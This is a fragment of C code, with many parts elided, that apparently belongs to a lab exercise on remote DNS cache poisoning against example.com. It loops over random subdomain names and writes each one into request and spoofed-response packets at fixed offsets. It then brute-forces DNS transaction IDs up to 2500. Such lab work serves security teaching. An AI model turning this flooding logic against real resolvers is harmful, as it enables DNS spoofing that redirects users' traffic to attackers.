...
int main()
{
  ...
  while (1) {
   ...
   // Generate a random name with length 5
    ...
    memcpy(ip_req +41, name , 5); //modify the name in the q field (offset = 41)
   memcpy(ip_resp+41, name, 5); //modify the name in q field
   memcpy(ip_resp+64, name, 5); //modify the name in q field
    send_dns_request(&ip_req, n_req); //Send the DNS Request
    //printf("attempt #%ld. request is [%.5s.example.com], transaction ID is: [%hu]\n", ++i, name, transaction_id);
   ...
   // memcpy(ip_resp+64, name, 5); //modify the name in q field
    ...
    for (transaction_id = 1;transaction_id <2500 ; transaction_id++){
    printf("attempt #%ld. request is [%.5s.example.com], transaction ID is: [%hu]\n", ++i, name, transaction_id);
